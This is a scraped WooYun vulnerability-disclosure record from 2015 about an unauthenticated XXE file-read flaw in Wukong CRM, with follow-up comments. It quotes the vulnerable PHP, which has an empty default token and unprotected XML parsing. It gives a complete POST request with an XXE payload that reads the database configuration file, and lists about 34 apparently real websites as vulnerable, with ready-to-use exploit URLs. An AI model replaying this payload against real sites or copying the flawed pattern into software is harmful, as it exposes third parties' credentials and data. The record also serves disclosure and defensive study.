{"id": 71172, "wybug_id": "wooyun-2015-0135088", "wybug_title": "悟空CRM一处任意文件读取（无需登录）", "wybug_corp": "郑州卡卡罗特软件科技有限公司", "wybug_author": "1c3z", "wybug_date": "2015-08-18 20:32", "wybug_open_date": "2015-11-21 20:35", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-23：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-21：\t细节向公众公开  简要描述： xxe 详细说明：  测试版本：http://cdn.5kcrm.com/Uploads/v0.5.1.zip\n//App\\Lib\\Action\\WeixinAction.class.phpprivate function checkSignature() {        $signature = $_GET[\"signature\"];        $timestamp = $_GET[\"timestamp\"];        $nonce = $_GET[\"nonce\"];        $echostr = $_GET[\"echostr\"];                                $token = $this->_token;         $tmpArr = array($token, $timestamp, $nonce);        sort($tmpArr);        $tmpStr = implode( $tmpArr );        $tmpStr = sha1( $tmpStr );        if( $tmpStr == $signature && $echostr != \"\"){            echo $echostr;            die();        }elseif( $tmpStr == $signature){            return true;        }else{            return false;        }    }        public function _initialize(){        $weixin = M('Config')->where('name = \"weixin\"')->getField('value');        $weixin_config = unserialize($weixin);        $this->_token = $weixin_config['WEIXIN_TOKEN'];        $this->bd_url = $weixin_config['WEIXIN_BD_URL'];        if(!$this->checkSignature()){            echo 'illegal origin';            exit;        }        $postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];        $this->_post = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);            }//部分代码就补贴了\ncheckSignature函数做了一些验证，但是token默认为空，而且大多数用户都不会使用微信这个功能可以计算出signature=da39a3ee5e6b4b0d3255bfef95601890afd80709通关验证本地测试：直接post：\nPOST /wukongcrm/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 HTTP/1.1Host: 192.168.1.119Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.130 Chrome/43.0.2357.130 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8Content-Length: 259<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE copyright [<!ENTITY test SYSTEM \"php://filter/read=convert.base64-encode/resource=App/Conf/db.php\">]><xml><ToUserName>&test;</ToUserName><MsgType>event</MsgType><Event>subscribe</Event></xml>\n\n\nbase64解密\n\n其他案例\n\n\n\n\n\n   漏洞证明：  经测试下面的都可以xxe http://c.ezcx.net/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://club.toread.com.cn/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://cn.linkedin.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://crm.83890111.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://crm.bzy0310.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://crm.h5yun.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://crm.trendsun.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://crm.wdjkj.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://crm.xiaomayi.net/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://crm.xinzc.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://crm.zhumengwang.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://crm.zw-group.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://kangoutj.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://mail.yonxi.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://nan-hu.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://oa.fei-yu.net/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://scruiqi.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.31863.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.390m.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.5djh.cn/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.banchang.cc/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.f800.cn/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.hapoin.com.cn/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.icbiz.cn/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.kszsmj.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.nmcxny.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.p8web.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.sdby91.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.shop-jacket.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.wxin.top/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.xjzhongrui.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.xushuishiwu.cn/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://www.zyylwk.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709 http://xjzhongrui.com/index.php?m=weixin&a=index&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709   修复方案：  参考http://wiki.wooyun.org/web:xxe-attack   版权声明：转载请注明来源 1c3z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-21 20:35 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-19 09:43 |    \t\t染血の雪 \t\t\t( 普通白帽子  |\t\t\t        Rank:180 漏洞数:28        | 击缻)\t\t \n  公司名字好牛逼~超级赛亚人你怕不怕    \n     2015-08-21 07:30 |    \t\tElliott \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:10        | 绝逼不当程序员)\t\t \n  .NET洞好不好挖    \n     2015-08-21 09:46 |    \t\t1c3z \t\t\t( 普通白帽子  |\t\t\t        Rank:246 漏洞数:50        | #)\t\t \n  @Elliott 那是php写的 .NET洞确实不好挖    \n     2015-08-21 11:04 |    \t\tElliott \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:10        | 绝逼不当程序员)\t\t \n  超级赛亚人你怕不怕    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}